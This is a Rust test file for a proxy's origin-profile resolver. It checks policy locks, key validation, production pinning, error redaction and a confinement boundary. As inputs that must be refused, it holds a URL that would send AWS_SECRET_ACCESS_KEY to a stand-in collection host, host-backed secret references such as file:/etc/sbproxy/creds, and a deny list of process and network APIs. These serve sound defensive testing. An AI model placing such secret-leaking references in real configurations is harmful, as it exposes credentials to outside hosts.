        Content-Security-Policy: "default-src 'self'"
"#;
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      policies:
        - name: my_limit
          type: request_limit
          max_body_size: 1024
      response_modifiers:
        - name: my_headers
          headers:
            set:
              X-Service: checkout
"#;
    let resolution = compose(profile, CHECKOUT_ENTRY, Some(floor));
    let origin = as_yaml(&resolution, "checkout.acme.test");
    assert_eq!(names(&origin, "policies"), vec!["waf", "request_limit"]);
    assert_eq!(list(&origin, "response_modifiers").len(), 2);
}

/// A lock binds the project, not the platform. The entry `overrides:`
/// block may add whatever it likes, because both sides of that argument
/// are the runtime config.
#[test]
fn the_entry_override_layer_may_shadow_a_lock() {
    let floor = r#"
response_modifiers:
  - name: platform_security
    locked: true
    headers:
      set:
        Content-Security-Policy: "default-src 'self'"
"#;
    let entry_yaml = r#"
name: checkout
repo: https://git.test/acme/checkout
path: sbproxy/origin.yaml
hosts:
  api: ["checkout.acme.test"]
overrides:
  response_modifiers:
    - name: incident_override
      headers:
        set:
          Content-Security-Policy: "default-src *"
"#;
    let resolution = compose(CHECKOUT_PROFILE, entry_yaml, Some(floor));
    assert_eq!(
        list(
            &as_yaml(&resolution, "checkout.acme.test"),
            "response_modifiers"
        )
        .len(),
        2
    );
}

// --- WOR-2436: what a runtime-authored origin block may say ------------

/// A misspelled key in `origin_defaults` used to pass `sbproxy validate`
/// clean and fail every compose at the aggregator, which is the far end
/// of a GitOps loop. Neither block carries `deny_unknown_fields`, because
/// the merge runs before the typed parse, so this check is what puts the
/// refusal back where the operator is.
#[test]
fn a_misspelled_key_in_origin_defaults_is_refused_at_load() {
    let floor = defaults("forced_ssl: true\n");
    let error = validate_origin_defaults(&floor).expect_err("a typo must be refused");
    assert!(matches!(error, OriginResolveError::UnknownOriginKey { .. }));
    assert!(error.to_string().contains("forced_ssl"), "{error}");
}

/// The key check is asked through the same classification the write
/// boundary uses, so it covers every origin field including the ones no
/// project may write.
#[test]
fn a_platform_owned_key_in_origin_defaults_is_accepted() {
    for key in [
        "force_ssl: true\n",
        "filters: []\n",
        "stream_safety: [pii]\n",
    ] {
        validate_origin_defaults(&defaults(key))
            .unwrap_or_else(|error| panic!("`{key}` is a real origin field: {error}"));
    }
}

/// A policy type no module answers to is refused where it is written.
/// Every composed origin inherits the floor, so the whole fleet would
/// have refused to boot on this one entry.
#[test]
fn an_unknown_policy_type_in_origin_defaults_is_refused_at_load() {
    let floor = defaults("policies:\n  - name: rl\n    type: rate_limit\n");
    let error = validate_origin_defaults(&floor).expect_err("an unknown type must be refused");
    assert!(matches!(error, OriginResolveError::UnknownEntryType { .. }));
    assert!(error.to_string().contains("rate_limit"), "{error}");
    // The real spelling loads.
    validate_origin_defaults(&defaults(
        "policies:\n  - name: rl\n    type: rate_limiting\n",
    ))
    .expect("`rate_limiting` is the spelling the dispatcher answers to");
}

/// A floor entry with no `type:` dispatches to nothing, and a project
/// overriding it by name would be overriding nothing.
#[test]
fn a_typeless_policy_in_origin_defaults_is_refused_at_load() {
    let floor = defaults("policies:\n  - name: rl\n    requests_per_minute: 10\n");
    assert!(matches!(
        validate_origin_defaults(&floor).expect_err("a typeless floor policy must be refused"),
        OriginResolveError::MissingEntryType { .. }
    ));
}

/// The same three checks run over an entry's `overrides:`, which is the
/// same shape written by the same people, with one difference: a `type:`
/// is optional there, because a named override is usually a partial edit
/// of a floor entry that already carries one.
#[test]
fn an_entry_override_block_is_checked_the_same_way_with_optional_types() {
    let bad: OriginSourcesConfig = serde_yaml::from_str(
        "entries:\n  - name: checkout\n    repo: https://git.test/a/b\n    path: p.yaml\n    \
         overrides:\n      forced_ssl: true\n",
    )
    .expect("parses");
    let error = validate_origin_sources(&bad).expect_err("a typo must be refused");
    assert!(matches!(error, OriginResolveError::UnknownOriginKey { .. }));
    assert!(error.to_string().contains("checkout"), "{error}");

    let partial: OriginSourcesConfig = serde_yaml::from_str(
        "entries:\n  - name: checkout\n    repo: https://git.test/a/b\n    path: p.yaml\n    \
         overrides:\n      policies:\n        - name: rate_limit\n          \
         requests_per_minute: 5000\n",
    )
    .expect("parses");
    validate_origin_sources(&partial)
        .expect("a named partial override needs no `type:` of its own");
}

// --- WOR-2436: the metric, on every load -------------------------------

/// Every series on every load, including the loads where the block is
/// absent. A gauge only written on the present path keeps its last value
/// when the block is deleted and keeps the old tier's series when a
/// document is promoted, which are the two readings the dashboard panel
/// and the docs tell an operator to alert on.
#[test]
fn the_entry_counts_cover_every_tier_on_every_load() {
    // No block at all: both tiers read zero, so a deleted block shows up
    // as the drop to zero the panel describes.
    for (tier, pinned, unpinned) in sbproxy_config::origin_source_entry_counts(None) {
        assert_eq!((pinned, unpinned), (0, 0), "{tier:?}");
    }

    let production: OriginSourcesConfig = serde_yaml::from_str(
        "tier: production\nentries:\n  - name: a\n    repo: https://git.test/a/b\n    \
         path: p.yaml\n    revision: refs/tags/v1\n  - name: b\n    \
         repo: https://git.test/c/d\n    path: p.yaml\n    \
         revision: 0123456789abcdef0123456789abcdef01234567\n",
    )
    .expect("parses");
    let counts = sbproxy_config::origin_source_entry_counts(Some(&production));
    for (tier, pinned, unpinned) in counts {
        match tier {
            EnvironmentTier::Production => assert_eq!((pinned, unpinned), (2, 0)),
            // The tier that is not in force must be written as zero, or a
            // promotion from development to production leaves the old
            // series standing at its last reading forever.
            EnvironmentTier::Development => assert_eq!((pinned, unpinned), (0, 0)),
        }
    }

    let development: OriginSourcesConfig = serde_yaml::from_str(
        "entries:\n  - name: a\n    repo: https://git.test/a/b\n    path: p.yaml\n    \
         revision: main\n",
    )
    .expect("parses");
    let counts = sbproxy_config::origin_source_entry_counts(Some(&development));
    for (tier, pinned, unpinned) in counts {
        match tier {
            EnvironmentTier::Development => assert_eq!((pinned, unpinned), (0, 1)),
            EnvironmentTier::Production => assert_eq!((pinned, unpinned), (0, 0)),
        }
    }
}

// --- WOR-2434: a refusal never carries a value -------------------------

/// The three variants that report a deserialization failure would echo
/// the offending value if they carried serde's error, because serde
/// renders it: `invalid type: string "sk-live-...", expected f32`.
///
/// The path is real rather than theoretical. `refuse_inline_secrets` runs
/// before the typed parse, but it matches on key names, and
/// `token_bytes_ratio` is not a secret-shaped key. A fat-fingered binding
/// reaches the typed parse and comes back out inside the refusal, which
/// the aggregator logs.
#[test]
fn a_type_mismatch_refusal_does_not_echo_the_value() {
    const SENTINEL: &str = "sk-live-SENTINELVALUE";
    let profile = r#"
name: checkout
inputs:
  - name: ratio
spec:
  api:
    base:
      action: {type: proxy, url: https://checkout.internal}
      token_bytes_ratio: "{{vars.ratio}}"
"#;
    let entry_yaml = format!(
        "name: checkout\nrepo: https://git.test/acme/checkout\npath: sbproxy/origin.yaml\n\
         hosts:\n  api: [\"checkout.acme.test\"]\ninputs:\n  ratio: \"{SENTINEL}\"\n"
    );
    let error = compose_err(profile, &entry_yaml, None);
    let text = error.to_string();
    assert!(
        matches!(error, OriginResolveError::ProfileParse { .. }),
        "expected the typed parse to refuse it, got: {text}"
    );
    assert!(
        !text.contains(SENTINEL),
        "the refusal echoed the bound value: {text}"
    );
    assert!(
        text.contains("[redacted]"),
        "the value should be visibly removed rather than silently dropped: {text}"
    );
    assert!(
        text.contains("token_bytes_ratio") || text.contains("f32"),
        "the refusal still has to say what was wrong: {text}"
    );
}

/// Redaction must not take the field name with it. The write boundary's
/// whole job is naming the key a project may not set, and serde spells an
/// identifier with backticks and a value with double quotes, which is
/// what makes the scrub a one-rule pass rather than a parser.
#[test]
fn redaction_keeps_the_field_name_the_write_boundary_has_to_name() {
    let profile = "name: checkout\nspec:\n  api:\n    base:\n      action: {type: proxy}\n      \
                   force_ssl: false\n";
    let error = compose_err(profile, CHECKOUT_ENTRY, None).to_string();
    assert!(error.contains("force_ssl"), "{error}");
    assert!(error.contains("unknown field"), "{error}");
}

// --- WOR-2435: the read boundary --------------------------------------

/// A project-owned profile is a confined document. Each of these is the
/// spelling that reads the composing host, and each is refused.
#[test]
fn a_profile_cannot_read_the_composing_process_environment() {
    for reach in [
        r#"url: "https://collect.example/${AWS_SECRET_ACCESS_KEY}""#,
        r#"url: "{{env.AWS_SECRET_ACCESS_KEY}}""#,
    ] {
        let profile = format!(
            "name: checkout\nspec:\n  api:\n    base:\n      action:\n        type: proxy\n        \
             {reach}\n"
        );
        let error = compose_err(&profile, CHECKOUT_ENTRY, None);
        assert!(
            matches!(error, OriginResolveError::Confined { .. }),
            "`{reach}` must be refused: {error}"
        );
    }
}

/// The host-backed secret references, refused for the same reason.
#[test]
fn a_profile_cannot_carry_a_host_backed_secret_reference() {
    for reference in [
        "env:AWS_SECRET_ACCESS_KEY",
        "file:/etc/sbproxy/creds",
        "vault://env/TOKEN",
    ] {
        let profile = format!(
            "name: checkout\nspec:\n  api:\n    base:\n      action: {{type: proxy}}\n      \
             action:\n        type: ai_proxy\n        providers:\n          - name: openai\n            \
             api_key: \"{reference}\"\n"
        );
        let error = compose_err(&profile, CHECKOUT_ENTRY, None);
        assert!(
            matches!(error, OriginResolveError::Confined { .. }),
            "`{reference}` must be refused: {error}"
        );
    }
}

/// And a host path the proxy would open.
#[test]
fn a_profile_cannot_name_a_host_path_the_proxy_opens() {
    let profile = r#"
name: checkout
spec:
  api:
    base:
      action:
        type: proxy
        url: https://checkout.internal
      policies:
        - name: opa
          type: rego
          rego_module_path: /etc/sbproxy/policy.rego
"#;
    let error = compose_err(profile, CHECKOUT_ENTRY, None);
    assert!(
        matches!(error, OriginResolveError::Confined { .. }),
        "{error}"
    );
}

// --- WOR-2436: the runtime blocks -------------------------------------

/// The tier comes from the runtime document, so an entry cannot declare
/// its way out of the rule.
#[test]
fn an_entry_cannot_escape_the_production_tier_by_declaring_its_own_environment() {
    let sources: OriginSourcesConfig = serde_yaml::from_str(
        r#"
tier: production
entries:
  - name: checkout
    repo: https://git.test/acme/checkout
    revision: main
    path: sbproxy/origin.yaml
    environment: dev
"#,
    )
    .expect("parses");
    assert_eq!(sources.tier, EnvironmentTier::Production);
    let error = validate_origin_sources(&sources).expect_err("a branch ref must be refused");
    assert!(matches!(
        error,
        OriginResolveError::MovableRefInProductionTier { .. }
    ));
    assert!(error.to_string().contains("checkout"), "{error}");
    assert!(error.to_string().contains("main"), "{error}");
}

/// A full sha and a long-spelled tag both load in the production tier.
#[test]
fn a_full_sha_and_a_tag_both_load_in_the_production_tier() {
    for revision in [
        "refs/tags/v1.4.2",
        "0123456789abcdef0123456789abcdef01234567",
    ] {
        let sources: OriginSourcesConfig = serde_yaml::from_str(&format!(
            "tier: production\nentries:\n  - name: checkout\n    repo: https://git.test/a/b\n    \
             revision: {revision}\n    path: sbproxy/origin.yaml\n"
        ))
        .expect("parses");
        validate_origin_sources(&sources)
            .unwrap_or_else(|error| panic!("`{revision}` must load: {error}"));
    }
}

/// An unpinned entry in the production tier is refused, and told what to
/// write instead.
#[test]
fn an_unpinned_entry_is_refused_in_the_production_tier() {
    let sources: OriginSourcesConfig = serde_yaml::from_str(
        "tier: production\nentries:\n  - name: checkout\n    repo: https://git.test/a/b\n    \
         path: sbproxy/origin.yaml\n",
    )
    .expect("parses");
    let error = validate_origin_sources(&sources).expect_err("unpinned must be refused");
    assert!(matches!(
        error,
        OriginResolveError::UnpinnedInProductionTier { .. }
    ));
    assert!(error.to_string().contains("refs/tags/"), "{error}");
}

/// The development tier is the default and takes a branch.
#[test]
fn the_development_tier_takes_a_branch_ref() {
    let sources: OriginSourcesConfig = serde_yaml::from_str(
        "entries:\n  - name: checkout\n    repo: https://git.test/a/b\n    revision: main\n    \
         path: sbproxy/origin.yaml\n",
    )
    .expect("parses");
    assert_eq!(sources.tier, EnvironmentTier::Development);
    validate_origin_sources(&sources).expect("a branch is fine outside production");
}

/// An entry may set the transport fields, and an inline credential is
/// refused with an error that does not echo it.
#[test]
fn an_entry_takes_the_git_transport_fields_and_refuses_an_inline_credential() {
    let ok: OriginSourcesConfig = serde_yaml::from_str(
        r#"
entries:
  - name: checkout
    repo: https://git.test/a/b
    path: sbproxy/origin.yaml
    credential: "secret://ci/github-token"
    verify_signature: true
    timeout_secs: 20
"#,
    )
    .expect("parses");
    validate_origin_sources(&ok).expect("a reference is accepted");
    assert!(ok.entries[0].verify_signature);
    assert_eq!(ok.entries[0].timeout_secs, 20);

    let literal: OriginSourcesConfig = serde_yaml::from_str(
        "entries:\n  - name: checkout\n    repo: https://git.test/a/b\n    \
         path: sbproxy/origin.yaml\n    credential: \"ghp_INLINELITERAL\"\n",
    )
    .expect("parses");
    let error = validate_origin_sources(&literal).expect_err("an inline literal must be refused");
    assert!(matches!(error, OriginResolveError::InlineCredential { .. }));
    assert!(!error.to_string().contains("ghp_INLINELITERAL"), "{error}");
}

/// Two entries sharing a name is refused: every refusal in this module
/// names an entry, so the names have to be unique to mean anything.
#[test]
fn two_entries_sharing_a_name_are_refused() {
    let sources: OriginSourcesConfig = serde_yaml::from_str(
        "entries:\n  - name: checkout\n    repo: https://git.test/a/b\n    path: p.yaml\n  \
         - name: checkout\n    repo: https://git.test/c/d\n    path: p.yaml\n",
    )
    .expect("parses");
    assert!(matches!(
        validate_origin_sources(&sources).expect_err("duplicate names must be refused"),
        OriginResolveError::DuplicateEntryName { .. }
    ));
}

/// Both blocks round-trip through YAML unchanged, on one `ConfigFile`.
///
/// `origin_defaults` is the half that could actually lose something: it
/// is held as an untyped `Mapping` rather than a typed struct, so a
/// round-trip is the only thing that says the mapping survives a
/// serialize and a re-parse with its nesting and its bookkeeping keys
/// intact.
#[test]
fn both_blocks_round_trip() {
    let yaml = r#"
tier: production
entries:
  - name: checkout
    repo: https://git.test/acme/checkout
    revision: refs/tags/v1.4.2
    path: sbproxy/origin.yaml
    credential: "secret://ci/token"
    verify_signature: true
    timeout_secs: 30
    environment: prod
    hosts:
      api:
        - checkout.acme.test
    inputs:
      upstream_key: "secret://prod/key"
    overrides:
      policies:
        - name: rate_limit
          requests_per_minute: 5000
"#;
    let parsed: OriginSourcesConfig = serde_yaml::from_str(yaml).expect("parses");
    let round_tripped: OriginSourcesConfig =
        serde_yaml::from_str(&serde_yaml::to_string(&parsed).expect("serializes"))
            .expect("re-parses");
    assert_eq!(parsed, round_tripped);

    // And both blocks together, on the container the node actually
    // parses, because `origin_defaults` only exists there.
    let document = format!(
        "origins: {{}}\norigin_defaults:\n  policies:\n    - name: waf\n      type: waf\n      \
         locked: true\n      owasp_crs:\n        enabled: true\norigin_sources:{yaml}"
    );
    let config: sbproxy_config::ConfigFile =
        serde_yaml::from_str(&document).expect("the whole document parses");
    let text = serde_yaml::to_string(&config).expect("the whole document serializes");
    let again: sbproxy_config::ConfigFile = serde_yaml::from_str(&text).expect("re-parses");
    assert_eq!(
        config.origin_sources.as_ref(),
        again.origin_sources.as_ref()
    );
    assert_eq!(
        config.origin_defaults.as_ref(),
        again.origin_defaults.as_ref(),
        "the untyped floor is the half a round-trip could lose"
    );
    let floor = again.origin_defaults.expect("the floor survived");
    validate_origin_defaults(&floor).expect("and it is still a valid floor");
}

/// Unknown keys in either block are refused rather than dropped, which
/// is the rule every nested container in this schema follows.
#[test]
fn an_unknown_key_in_an_entry_is_refused() {
    let error = serde_yaml::from_str::<OriginSourcesConfig>(
        "entries:\n  - name: checkout\n    repo: https://git.test/a/b\n    path: p.yaml\n    \
         refresh_interval_secs: 30\n",
    )
    .expect_err("an unknown entry key must be refused");
    assert!(error.to_string().contains("unknown field"), "{error}");
}

/// The composed origins map is keyed by host and nothing else, and the
/// resolver reports what it produced rather than mutating a global.
#[test]
fn the_resolution_reports_what_it_produced() {
    let first = entry(CHECKOUT_ENTRY);
    let second = entry(
        r#"
name: billing
repo: https://git.test/acme/billing
path: sbproxy/origin.yaml
hosts:
  api: ["billing.acme.test"]
"#,
    );
    let billing_profile = r#"
name: billing
spec:
  api:
    base:
      action: {type: proxy, url: https://billing.internal}
"#;
    let floor = defaults(FLOOR);
    let resolution = resolve_origins(
        Some(&floor),
        &[
            ProfileBinding {
                entry: &first,
                document: CHECKOUT_PROFILE,
            },
            ProfileBinding {
                entry: &second,
                document: billing_profile,
            },
        ],
        &no_local_origins(),
    )
    .expect("two entries compose");
    let hosts: Vec<&String> = resolution.origins.keys().collect();
    assert_eq!(hosts, vec!["billing.acme.test", "checkout.acme.test"]);
    assert!(resolution.drops.is_empty());
}

/// The whole model runs on inputs the caller already holds. The
/// composition below is driven entirely by two string constants, and the
/// entry names a repository that is never opened.
#[test]
fn the_resolver_composes_from_text_alone() {
    let resolution = compose(CHECKOUT_PROFILE, CHECKOUT_ENTRY, Some(FLOOR));
    assert_eq!(resolution.origins.len(), 1);
    assert_eq!(
        entry(CHECKOUT_ENTRY).repo,
        "https://git.test/acme/checkout",
        "the repository is a label here, not something opened"
    );
}

/// The resolver has no filesystem access and no network access anywhere,
/// so a unit test of it runs on a machine with no `git`.
///
/// Asserted structurally rather than by unsetting `PATH`, for two
/// reasons. A test that mutates the process environment is racy against
/// every other test in the binary, and the repository guards env mutation
/// for exactly that reason. And unsetting `PATH` would only prove that
/// this one composition made no `exec`, while what the ticket asks is
/// that no path through the module can. Reading the module's own source
/// answers the second question.
///
/// The one exception is deliberate and narrow: the tests at the bottom of
/// the module read the shipped schemas to run the field-classification
/// ratchet, so the scan stops at the `#[cfg(test)]` boundary.
///
/// # What this cannot see
///
/// It is a textual scan of one file, so it says nothing about what the
/// module *calls*. The resolver reaches outside itself three times, and
/// each one is named here rather than left to the reader:
/// `crate::source::redact_repo` (a string rewrite),
/// `crate::source::is_full_commit_sha` (a length and hex-digit check),
/// and `crate::validate::KNOWN_POLICY_TYPES` / `KNOWN_TRANSFORM_TYPES`
/// (two `&[&str]` constants). None of the four opens anything, and they
/// are listed because the next call added is the one this scan would
/// wave through. The scan is still the wider half of the claim: the
/// module cannot open a file or a socket itself, and its four callees
/// are small enough to have been read.
#[test]
fn nothing_in_the_resolver_opens_a_file_or_a_socket() {
    let source = std::fs::read_to_string(
        std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR")).join("src/origin_profile.rs"),
    )
    .expect("the module source is readable");
    let production = source
        .split_once("\n#[cfg(test)]\n")
        .map_or(source.as_str(), |(before, _)| before);
    assert!(
        production.len() > 20_000,
        "the split found no test module, so this scanned the wrong text"
    );
    for reach in [
        "std::fs",
        "std::process",
        "std::net",
        "std::env",
        "tokio::",
        "reqwest",
        "fs::File",
        "OpenOptions",
        "read_to_string",
        "Command::",
        "TcpStream",
    ] {
        assert!(
            !production.contains(reach),
            "`{reach}` appears in the resolver; it is supposed to be a pure function of the \
             documents its caller already holds"
        );
    }
}

/// A config with neither block behaves exactly as it did before they
/// existed. The v1-compat fixture sweep covers the wider claim; this
/// pins the narrow one next to the code that could break it.
#[test]
fn a_config_with_neither_block_is_unchanged() {
    let yaml = "origins:\n  \"api.test\":\n    action:\n      type: static\n      \
                status_code: 200\n      content_type: text/plain\n      body: ok\n";
    let config: sbproxy_config::ConfigFile = serde_yaml::from_str(yaml).expect("parses");
    assert!(config.origin_defaults.is_none());
    assert!(config.origin_sources.is_none());
    sbproxy_config::compile_config(yaml).expect("compiles exactly as before");
    // And the serialized form gains no keys, so a round-trip through the
    // authority's re-serialization does not invent an empty block.
    let round_tripped = serde_yaml::to_string(&config).expect("serializes");
    assert!(
        !round_tripped.contains("origin_defaults"),
        "{round_tripped}"
    );
    assert!(!round_tripped.contains("origin_sources"), "{round_tripped}");
}

// --- the shipped example ---------------------------------------------

/// The example pair in `examples/origin-profiles/` really composes.
///
/// `validate_examples` runs every example `sb.yml` through
/// `compile_config`, which by design cannot see inside an opaque
/// `policies:` entry and never opens the project half at all. This runs
/// both halves through the resolver, so a reader following the README
/// cannot be the one who discovers it does not work.
#[test]
fn the_shipped_example_pair_composes() {
    let root = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .expect("crates/")
        .parent()
        .expect("workspace root")
        .join("examples/origin-profiles");
    let runtime_yaml = std::fs::read_to_string(root.join("sb.yml")).expect("sb.yml is readable");
    let runtime: sbproxy_config::ConfigFile =
        serde_yaml::from_str(&runtime_yaml).expect("sb.yml parses");
    let profile =
        std::fs::read_to_string(root.join("origin.yaml")).expect("origin.yaml is readable");

    let sources = runtime
        .origin_sources
        .as_ref()
        .expect("the example declares origin_sources");
    validate_origin_sources(sources).expect("the example's entries load");
    let defaults = runtime
        .origin_defaults
        .as_ref()
        .expect("the example declares origin_defaults");
    validate_origin_defaults(defaults).expect("the example's floor loads");

    let hand_written: BTreeSet<String> = runtime.origins.keys().cloned().collect();
    let bindings: Vec<ProfileBinding<'_>> = sources
        .entries
        .iter()
        .map(|entry| ProfileBinding {
            entry,
            document: &profile,
        })
        .collect();
    let resolution = resolve_origins(Some(defaults), &bindings, &hand_written)
        .expect("the shipped example composes");

    assert_eq!(
        resolution.origins.keys().cloned().collect::<Vec<_>>(),
        vec![
            "checkout.example.com".to_string(),
            "hooks.example.com".to_string()
        ]
    );

    let api = as_yaml(&resolution, "checkout.example.com");
    // The input the entry bound reached the action.
    assert_eq!(
        api.get("action")
            .and_then(|action| action.get("url"))
            .and_then(serde_yaml::Value::as_str),
        Some("https://checkout-us-east-1.internal.example.com")
    );
    // The environment layer the entry selected won.
    assert_eq!(
        api.get("action")
            .and_then(|action| action.get("host_override"))
            .and_then(serde_yaml::Value::as_str),
        Some("checkout.internal.example.com")
    );
    // The locked floor policy survived, the project's addition landed
    // after it, and the runtime override had the last word.
    assert_eq!(
        names(&api, "policies"),
        vec!["waf", "rate_limiting", "request_limit"],
        "floor first, then the project's addition"
    );
    assert_eq!(
        list(&api, "policies")[1].get("requests_per_minute"),
        Some(&serde_yaml::Value::Number(5000.into())),
        "the entry `overrides:` block bookends the stack"
    );
    assert_eq!(
        list(&api, "policies")[1].get("burst"),
        Some(&serde_yaml::Value::Number(100.into())),
        "and the floor field neither the project nor the entry mentioned survived"
    );
    // The runtime supplied the inbound credential, which is why the
    // profile does not carry an `authentication:` block at all.
    assert!(
        api.get("authentication")
            .and_then(|auth| auth.get("api_keys"))
            .is_some(),
        "the entry `overrides:` block owns the inbound credential: {api:?}"
    );
    // And the hand-written origin is untouched by any of it.
    assert!(hand_written.contains("status.example.com"));
}
